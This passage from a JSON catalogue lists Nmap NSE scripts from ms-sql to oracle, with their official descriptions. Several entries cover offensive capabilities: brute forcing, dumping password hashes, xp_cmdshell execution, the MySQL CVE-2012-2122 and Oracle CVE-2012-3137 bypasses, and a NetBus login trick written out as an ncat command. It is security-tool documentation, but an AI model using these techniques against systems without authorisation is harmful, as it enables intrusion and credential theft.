    "description": "Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user has\naccess to.\n\nSQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>\nand/or <code>mssql.username</code> & <code>mssql.password</code>)\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nThe script needs an account with the sysadmin server role to work.\n\nWhen run, the script iterates over the credentials and attempts to run\nthe command for each available set of credentials.\n\nNOTE: The \"owner\" field in the results will be truncated at 20 characters. This\nis a limitation of the <code>sp_MShasdbaccess</code> stored procedure that the\nscript uses.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-info.nse",
    "description": "Attempts to determine configuration and version information for Microsoft SQL\nServer instances.\n\nSQL Server credentials required: No (will not benefit from\n<code>mssql.username</code> & <code>mssql.password</code>).\nRun criteria:\n* Host script: Will always run.\n* Port script: N/A\n\nNOTE: Unlike previous versions, this script will NOT attempt to log in to SQL\nServer instances. Blank passwords can be checked using the\n<code>ms-sql-empty-password</code> script. E.g.:\n<code>nmap -sn --script ms-sql-empty-password --script-args mssql.instance-all <host></code>\n\nThe script uses two means of getting version information for SQL Server instances:\n* Querying the SQL Server Browser service, which runs by default on UDP port\n1434 on servers that have SQL Server 2000 or later installed. However, this\nservice may be disabled without affecting the functionality of the instances.\nAdditionally, it provides imprecise version information.\n* Sending a probe to the instance, causing the instance to respond with\ninformation including the exact version number. This is the same method that\nNmap uses for service versioning; however, this script can also do the same for\ninstances accessible via Windows named pipes, and can target all of the\ninstances listed by the SQL Server Browser service.\n\nIn the event that the script can connect to the SQL Server Browser service\n(UDP 1434) but is unable to connect directly to the instance to obtain more\naccurate version information (because ports are blocked or the <code>mssql.scanned-ports-only</code>\nargument has been used), the script will rely only upon the version number\nprovided by the SQL Server Browser/Monitor, which has the following limitations:\n* For SQL Server 2000 and SQL Server 7.0 instances, the RTM version number is\nalways given, regardless of any service packs or patches installed.\n* For SQL Server 2005 and later, the version number will reflect the service\npack installed, but the script will not be able to tell whether patches have\nbeen installed.\n\nWhere possible, the script will determine major version numbers, service pack\nlevels and whether patches have been installed. However, in cases where\nparticular determinations can not be made, the script will report only what can\nbe confirmed.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-ntlm-info.nse",
    "description": "This script enumerates information from remote Microsoft SQL services with NTLM\nauthentication enabled.\n\nSending a MS-TDS NTLM authentication request with an invalid domain and null\ncredentials will cause the remote service to respond with a NTLMSSP message\ndisclosing information to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-query.nse",
    "description": "Runs a query against Microsoft SQL Server (ms-sql).\n\nSQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>\nand/or <code>mssql.username</code> & <code>mssql.password</code>)\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-tables.nse",
    "description": "Queries Microsoft SQL Server (ms-sql) for a list of tables per database.\n\nSQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>\nand/or <code>mssql.username</code> & <code>mssql.password</code>)\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nThe sysdatabase table should be accessible by more or less everyone.\n\nOnce we have a list of databases we iterate over it and attempt to extract\ntable names. In order for this to succeed we need to have either\nsysadmin privileges or an account with access to the db. So, each\ndatabase we successfully enumerate tables from we mark as finished, then\niterate over known user accounts until either we have exhausted the users\nor found all tables in all the databases.\n\nSystem databases are excluded.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-xp-cmdshell.nse",
    "description": "Attempts to run a command using the command shell of Microsoft SQL\nServer (ms-sql).\n\nSQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>\nand/or <code>mssql.username</code> & <code>mssql.password</code>)\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nThe script needs an account with the sysadmin server role to work.\n\nWhen run, the script iterates over the credentials and attempts to run\nthe command until either all credentials are exhausted or until the\ncommand is executed.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "msrpc-enum.nse",
    "description": "Queries an MSRPC endpoint mapper for a list of mapped\nservices and displays the gathered information.\n\nAs it is using smb library, you can specify optional\nusername and password to use.\n\nScript works much like Microsoft's rpcdump tool\nor dcedump tool from SPIKE fuzzer.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mtrace.nse",
    "description": "Queries for the multicast path from a source to a destination host.\n\nThis works by sending an IGMP Traceroute Query and listening for IGMP\nTraceroute responses. The Traceroute Query is sent to the first hop and\ncontains information about source, destination and multicast group addresses.\nFirst hop defaults to the multicast All routers address. The default multicast\ngroup address is 0.0.0.0 and the default destination is our own host address. A\nsource address must be provided. The responses are parsed to get interesting\ninformation about interface addresses, used protocols and error codes.\n\nThis is similar to the mtrace utility provided in Cisco IOS.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "multicast-profinet-discovery.nse",
    "description": "Sends a multicast PROFINET DCP Identify All message and prints the responses.\n\nReference:\n* https://profinetuniversity.com/naming-addressing/profinet-dcp/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "murmur-version.nse",
    "description": "Detects the Murmur service (server for the Mumble voice communication\nclient) versions 1.2.X.\n\nThe Murmur server listens on a TCP (control) and a UDP (voice) port\nwith the same port number. This script activates on both a TCP and UDP\nport version scan. In both cases probe data is sent only to the UDP\nport because it allows for a simple and informative ping command.\n\nThe single probe will report on the server version, current user\ncount, maximum users allowed on the server, and bandwidth used for\nvoice communication. It is used by the Mumble client to ping known\nMurmur servers.\n\nThe IP address from which service detection is being ran will most\nlikely be temporarily banned by the target Murmur server due to\nmultiple incorrect handshakes (Nmap service probes). This ban makes\nidentifying the service via TCP impossible in practice, but does not\naffect the UDP probe used by this script.\n\nIt is possible to get a corrupt user count (usually +1) when doing a\nTCP service scan due to previous service probe connections affecting\nthe server.\n\nSee http://mumble.sourceforge.net/Protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-audit.nse",
    "description": "Audits MySQL database server security configuration against parts of\nthe CIS MySQL v1.0.2 benchmark (the engine can be used for other MySQL\naudits by creating appropriate audit files).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-brute.nse",
    "description": "Performs password guessing against MySQL.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-databases.nse",
    "description": "Attempts to list all databases on a MySQL server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-dump-hashes.nse",
    "description": "Dumps the password hashes from an MySQL server in a format suitable for\ncracking by tools such as John the Ripper.  Appropriate DB privileges (root) are required.\n\nThe <code>username</code> and <code>password</code> arguments take precedence\nover credentials discovered by the mysql-brute and mysql-empty-password\nscripts.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-empty-password.nse",
    "description": "Checks for MySQL servers with an empty password for <code>root</code> or\n<code>anonymous</code>.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-enum.nse",
    "description": "Performs valid-user enumeration against MySQL server using a bug\ndiscovered and published by Kingcope\n(http://seclists.org/fulldisclosure/2012/Dec/9).\n\nServer version 5.x are susceptible to an user enumeration\nattack due to different messages during login when using\nold authentication mechanism from versions 4.x and earlier.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-info.nse",
    "description": "Connects to a MySQL server and prints information such as the protocol and\nversion numbers, thread ID, status, capabilities, and the password salt.\n\nIf service detection is performed and the server appears to be blocking\nour host or is blocked because of too many connections, then this script\nisn't run (see the portrule).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-query.nse",
    "description": "Runs a query against a MySQL database and returns the results as a table.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-users.nse",
    "description": "Attempts to list all users on a MySQL server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-variables.nse",
    "description": "Attempts to show all variables on a MySQL server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mysql-vuln-cve2012-2122.nse",
    "description": "Attempts to bypass authentication in MySQL and MariaDB servers by\nexploiting CVE2012-2122. If its vulnerable, it will also attempt to\ndump the MySQL usernames and password hashes.\n\nAll MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are\nvulnerable but exploitation depends on whether memcmp() returns an\narbitrary integer outside of -128..127 range.\n\n\"When a user connects to MariaDB/MySQL, a token (SHA over a password\nand a random scramble string) is calculated and compared with the\nexpected value. Because of incorrect casting, it might've happened\nthat the token and the expected value were considered equal, even if\nthe memcmp() returned a non-zero value. In this case MySQL/MariaDB\nwould think that the password is correct, even while it is not.\nBecause the protocol uses random strings, the probability of hitting\nthis bug is about 1/256.  Which means, if one knows a user name to\nconnect (and \"root\" almost always exists), she can connect using *any*\npassword by repeating connection attempts. ~300 attempts takes only a\nfraction of second, so basically account password protection is as\ngood as nonexistent.\"\n\nOriginal public advisory:\n* http://seclists.org/oss-sec/2012/q2/493\nInteresting post about this vuln:\n* https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nat-pmp-info.nse",
    "description": "Gets the routers WAN IP using the NAT Port Mapping Protocol (NAT-PMP).\nThe NAT-PMP protocol is supported by a broad range of routers including:\n* Apple AirPort Express\n* Apple AirPort Extreme\n* Apple Time Capsule\n* DD-WRT\n* OpenWrt v8.09 or higher, with MiniUPnP daemon\n* pfSense v2.0\n* Tarifa (firmware) (Linksys WRT54G/GL/GS)\n* Tomato Firmware v1.24 or higher. (Linksys WRT54G/GL/GS and many more)\n* Peplink Balance",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nat-pmp-mapport.nse",
    "description": "Maps a WAN port on the router to a local port on the client using the NAT Port Mapping Protocol (NAT-PMP).  It supports the following operations:\n* map - maps a new external port on the router to an internal port of the requesting IP\n* unmap - unmaps a previously mapped port for the requesting IP\n* unmapall - unmaps all previously mapped ports for the requesting IP",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nbd-info.nse",
    "description": "Displays protocol and block device information from NBD servers.\n\nThe Network Block Device protocol is used to publish block devices\nover TCP. This script connects to an NBD server and attempts to pull\ndown a list of exported block devices and their details\n\nFor additional information:\n* https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nbns-interfaces.nse",
    "description": "Retrieves IP addresses of the target's network interfaces via NetBIOS NS.\nAdditional network interfaces may reveal more information about the target,\nincluding finding paths to hidden non-routed networks via multihomed systems.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nbstat.nse",
    "description": "Attempts to retrieve the target's NetBIOS names and MAC address.\n\nBy default, the script displays the name of the computer and the logged-in\nuser; if the verbosity is turned up, it displays all names the system thinks it\nowns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ncp-enum-users.nse",
    "description": "Retrieves a list of all eDirectory users from the Novell NetWare Core Protocol (NCP) service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ncp-serverinfo.nse",
    "description": "Retrieves eDirectory server information (OS version, server name,\nmounts, etc.) from the Novell NetWare Core Protocol (NCP) service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ndmp-fs-info.nse",
    "description": "Lists remote file systems by querying the remote device using the Network\nData Management Protocol (ndmp). NDMP is a protocol intended to transport\ndata between a NAS device and the backup device, removing the need for the\ndata to pass through the backup server. The following products are known\nto support the protocol:\n* Amanda\n* Bacula\n* CA Arcserve\n* CommVault Simpana\n* EMC Networker\n* Hitachi Data Systems\n* IBM Tivoli\n* Quest Software Netvault Backup\n* Symantec Netbackup\n* Symantec Backup Exec",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ndmp-version.nse",
    "description": "Retrieves version information from the remote Network Data Management Protocol\n(ndmp) service. NDMP is a protocol intended to transport data between a NAS\ndevice and the backup device, removing the need for the data to pass through\nthe backup server. The following products are known to support the protocol:\n* Amanda\n* Bacula\n* CA Arcserve\n* CommVault Simpana\n* EMC Networker\n* Hitachi Data Systems\n* IBM Tivoli\n* Quest Software Netvault Backup\n* Symantec Netbackup\n* Symantec Backup Exec",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nessus-brute.nse",
    "description": "Performs brute force password auditing against a Nessus vulnerability scanning daemon using the NTP 1.2 protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nessus-xmlrpc-brute.nse",
    "description": "Performs brute force password auditing against a Nessus vulnerability scanning daemon using the XMLRPC protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "netbus-auth-bypass.nse",
    "description": "Checks if a NetBus server is vulnerable to an authentication bypass\nvulnerability which allows full access without knowing the password.\n\nFor example a server running on TCP port 12345 on localhost with\nthis vulnerability is accessible to anyone. An attacker could\nsimply form a connection to the server ( ncat -C 127.0.0.1 12345 )\nand login to the service by typing Password;1; into the console.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "netbus-brute.nse",
    "description": "Performs brute force password auditing against the Netbus backdoor (\"remote administration\") service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "netbus-info.nse",
    "description": "Opens a connection to a NetBus server and extracts information about\nthe host and the NetBus service itself.\n\nThe extracted host information includes a list of running\napplications, and the hosts sound volume settings.\n\nThe extracted service information includes its access control list\n(acl), server information, and setup. The acl is a list of IP\naddresses permitted to access the service. Server information\ncontains details about the server installation path, restart\npersistence, user account that the server is running on, and the\namount of connected NetBus clients. The setup information contains\nconfiguration details, such as the services TCP port number, traffic\nlogging setting, password, an email address for receiving login\nnotifications, an email address used for sending the notifications,\nand an smtp-server used for notification delivery.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "netbus-version.nse",
    "description": "Extends version detection to detect NetBuster, a honeypot service\nthat mimes NetBus.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nexpose-brute.nse",
    "description": "Performs brute force password auditing against a Nexpose vulnerability scanner\nusing the API 1.1.\n\nAs the Nexpose application enforces account lockout after 4 incorrect login\nattempts, the script performs only 3 guesses per default. This can be\naltered by supplying the <code>brute.guesses</code> argument a different\nvalue or 0 (zero) to guess the whole dictionary.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nfs-ls.nse",
    "description": "Attempts to get useful information about files from NFS exports.\nThe output is intended to resemble the output of <code>ls</code>.\n\nThe script starts by enumerating and mounting the remote NFS exports. After\nthat it performs an NFS GETATTR procedure call for each mounted point\nin order to get its ACLs.\nFor each mounted directory the script will try to list its file entries\nwith their attributes.\n\nSince the file attributes shown in the results are the result of\nGETATTR, READDIRPLUS, and similar procedures, the attributes\nare the attributes of the local filesystem.\n\nThese access permissions are shown only with NFSv3:\n* Read:     Read data from file or read a directory.\n* Lookup:   Look up a name in a directory\n            (no meaning for non-directory objects).\n* Modify:   Rewrite existing file data or modify existing\n            directory entries.\n* Extend:   Write new data or add directory entries.\n* Delete:   Delete an existing directory entry.\n* Execute:  Execute file (no meaning for a directory).\n\nRecursive listing is not implemented.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nfs-showmount.nse",
    "description": "Shows NFS exports, like the <code>showmount -e</code> command.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nfs-statfs.nse",
    "description": "Retrieves disk space statistics and information from a remote NFS share.\nThe output is intended to resemble the output of <code>df</code>.\n\nThe script will provide pathconf information of the remote NFS if\nthe version used is NFSv3.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nje-node-brute.nse",
    "description": "z/OS JES Network Job Entry (NJE) target node name brute force.\n\nNJE node communication is made up of an OHOST and an RHOST. Both fields\nmust be present when conducting the handshake. This script attemtps to\ndetermine the target systems NJE node name.\n\nTo initiate NJE the client sends a 33 byte record containing the type of\nrecord, the hostname (RHOST), IP address (RIP), target (OHOST),\ntarget IP (OIP) and a 1 byte response value (R) as outlined below:\n\n<code>\n0 1 2 3 4 5 6 7 8 9 A B C D E F\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  TYPE       |     RHOST     |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  RIP  |  OHOST      | OIP   |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| R |\n+-+-+\n</code>\n\n* TYPE: Can either be 'OPEN', 'ACK', or 'NAK', in EBCDIC, padded by spaces to make 8 bytes. This script always send 'OPEN' type.\n* RHOST: Node name of the local machine initiating the connection. Set to 'FAKE'.\n* RIP: Hex value of the local systems IP address. Set to '0.0.0.0'\n* OHOST: The value being enumerated to determine the targets NJE node name.\n* OIP: IP address, in hex, of the target system. Set to '0.0.0.0'.\n* R: The response. NJE will send an 'R' of 0x01 if the OHOST is wrong or 0x04 if the OHOST is correct.\n\nBy default this script will attempt the brute force a mainframes OHOST. If supplied with\nthe argument <code>nje-node-brute.ohost</code> this script will attempt the bruteforce\nthe RHOST, setting OHOST to the value supplied to the argument.\n\nSince most systems will only have one OHOST name, it is recommended to use the\n<code>brute.firstonly</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nje-pass-brute.nse",
    "description": "z/OS JES Network Job Entry (NJE) 'I record' password brute forcer.\n\nAfter successfully negotiating an OPEN connection request, NJE requires sending,\nwhat IBM calls, an 'I record'. This initialization record may sometimes require\na password. This script, provided with a valid OHOST/RHOST for the NJE connection,\nbrute forces the password.\n\nMost systems only have one password, it is recommended to use the\n<code>brute.firstonly</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nntp-ntlm-info.nse",
    "description": "This script enumerates information from remote NNTP services with NTLM\nauthentication enabled.\n\nSending an MS-NNTP NTLM authentication request with null credentials will\ncause the remote service to respond with a NTLMSSP message disclosing\ninformation to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nping-brute.nse",
    "description": "Performs brute force password auditing against an Nping Echo service.\n\nSee https://nmap.org/book/nping-man-echo-mode.html for Echo Mode\ndocumentation.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "nrpe-enum.nse",
    "description": "Queries Nagios Remote Plugin Executor (NRPE) daemons to obtain information such\nas load averages, process counts, logged in user information, etc.\n\nThis script attempts to execute the stock list of commands that are\nenabled. User-supplied arguments are not supported.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ntp-info.nse",
    "description": "Gets the time and configuration variables from an NTP server. We send two\nrequests: a time request and a \"read variables\" (opcode 2) control message.\nWithout verbosity, the script shows the time and the value of the\n<code>version</code>, <code>processor</code>, <code>system</code>,\n<code>refid</code>, and <code>stratum</code> variables. With verbosity, all\nvariables are shown.\n\nSee RFC 1035 and the Network Time Protocol Version 4 Reference and\nImplementation Guide\n(http://www.eecis.udel.edu/~mills/database/reports/ntp4/ntp4.pdf) for\ndocumentation of the protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ntp-monlist.nse",
    "description": "Obtains and prints an NTP server's monitor data.\n\nMonitor data is a list of the most recently used (MRU) having NTP associations\nwith the target. Each record contains information about the most recent NTP\npacket sent by a host to the target including the source and destination\naddresses and the NTP version and mode of the packet. With this information it\nis possible to classify associated hosts as Servers, Peers, and Clients.\n\nA Peers command is also sent to the target and the peers list in the response\nallows differentiation between configured Mode 1 Peers and clients which act\nlike Peers (such as the Windows W32Time service).\n\nAssociated hosts are further classified as either public or private.\nPrivate hosts are those\nhaving IP addresses which are not routable on the public Internet and thus can\nhelp to form a picture about the topology of the private network on which the\ntarget resides.\n\nOther information revealed by the monlist and peers commands are the host with\nwhich the target clock is synchronized and hosts which send Control Mode (6)\nand Private Mode (7) commands to the target and which may be used by admins for\nthe NTP service.\n\nIt should be noted that the very nature of the NTP monitor data means that the\nMode 7 commands sent by this script are recorded by the target (and will often\nappear in these results). Since the monitor data is a MRU list, it is probable\nthat you can overwrite the record of the Mode 7 command by sending an innocuous\nlooking Client Mode request. This can be achieved easily using Nmap:\n<code>nmap -sU -pU:123 -Pn -n --max-retries=0 <target></code>\n\nNotes:\n* The monitor list in response to the monlist command is limited to 600 associations.\n* The monitor capability may not be enabled on the target in which case you may receive an error number 4 (No Data Available).\n* There may be a restriction on who can perform Mode 7 commands (e.g. \"restrict noquery\" in <code>ntp.conf</code>) in which case you may not receive a reply.\n* This script does not handle authenticating and targets expecting auth info may respond with error number 3 (Format Error).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "omp2-brute.nse",
    "description": "Performs brute force password auditing against the OpenVAS manager using OMPv2.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "omp2-enum-targets.nse",
    "description": "Attempts to retrieve the list of target systems and networks from an OpenVAS Manager server.\n\nThe script authenticates on the manager using provided or previously cracked\ncredentials and gets the list of defined targets for each account.\n\nThese targets will be added to the scanning queue in case\n<code>newtargets</code> global variable is set.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "omron-info.nse",
    "description": "This NSE script is used to send a FINS packet to a remote device. The script\nwill send a Controller Data Read Command and once a response is received, it\nvalidates that it was a proper response to the command that was sent, and then\nwill parse out the data.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "openflow-info.nse",
    "description": "Queries OpenFlow controllers for information. Newer versions of the OpenFlow\nprotocol (1.3 and greater) will return a list of all protocol versions supported\nby the controller. Versions prior to 1.3 only return their own version number.\n\nFor additional information:\n* https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-switch-v1.5.0.noipr.pdf",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "openlookup-info.nse",
    "description": "Parses and displays the banner information of an OpenLookup (network key-value store) server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "openvas-otp-brute.nse",
    "description": "Performs brute force password auditing against a OpenVAS vulnerability scanner daemon using the OTP 1.0 protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "openwebnet-discovery.nse",
    "description": "OpenWebNet is a communications protocol developed by Bticino since 2000.\nRetrieves device identifying information and number of connected devices.\n\nReferences:\n* https://www.myopen-legrandgroup.com/solution-gallery/openwebnet/\n* http://www.pimyhome.org/wiki/index.php/OWN_OpenWebNet_Language_Reference",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "oracle-brute-stealth.nse",
    "description": "Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's\nO5LOGIN authentication scheme.  The vulnerability exists in Oracle 11g\nR1/R2 and allows linking the session key to a password hash.  When\ninitiating an authentication attempt as a valid user the server will\nrespond with a session key and salt.  Once received the script will\ndisconnect the connection thereby not recording the login attempt.\nThe session key and salt can then be used to brute force the users\npassword.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "oracle-brute.nse",
    "description": "Performs brute force password auditing against Oracle servers.\n\nRunning it in default mode it performs an audit against a list of common\nOracle usernames and passwords. The mode can be changed by supplying the\nargument oracle-brute.nodefault at which point the script will use the\nusername- and password- lists supplied with Nmap. Custom username- and\npassword- lists may be supplied using the userdb and passdb arguments.\nThe default credential list can be changed too by using the brute.credfile\nargument. In case the userdb or passdb arguments are supplied, the script\nassumes that it should run in the nodefault mode.\n\nIn modern versions of Oracle password guessing speeds decrease after a few\nguesses and remain slow, due to connection throttling.\n\nWARNING: The script makes no attempt to discover the amount of guesses\nthat can be made before locking an account. Running this script may therefor\nresult in a large number of accounts being locked out on the database server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "oracle-enum-users.nse",
    "description": "Attempts to enumerate valid Oracle user names against unpatched Oracle 11g\nservers (this bug was fixed in Oracle's October 2009 Critical Patch Update).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "oracle-sid-brute.nse",
    "description": "Guesses Oracle instance/SID names against the TNS-listener.\n\nIf the <code>oraclesids</code> script argument is not used to specify an\nalternate file, the default <code>oracle-sids</code> file will be used.\nLicense to use the <code>oracle-sids</code> file was granted by its\nauthor, Alexander Kornbrust (http://seclists.org/nmap-dev/2009/q4/645).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "oracle-tns-version.nse",
    "description": "Decodes the VSNNUM version number from an Oracle TNS listener.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ovs-agent-version.nse",
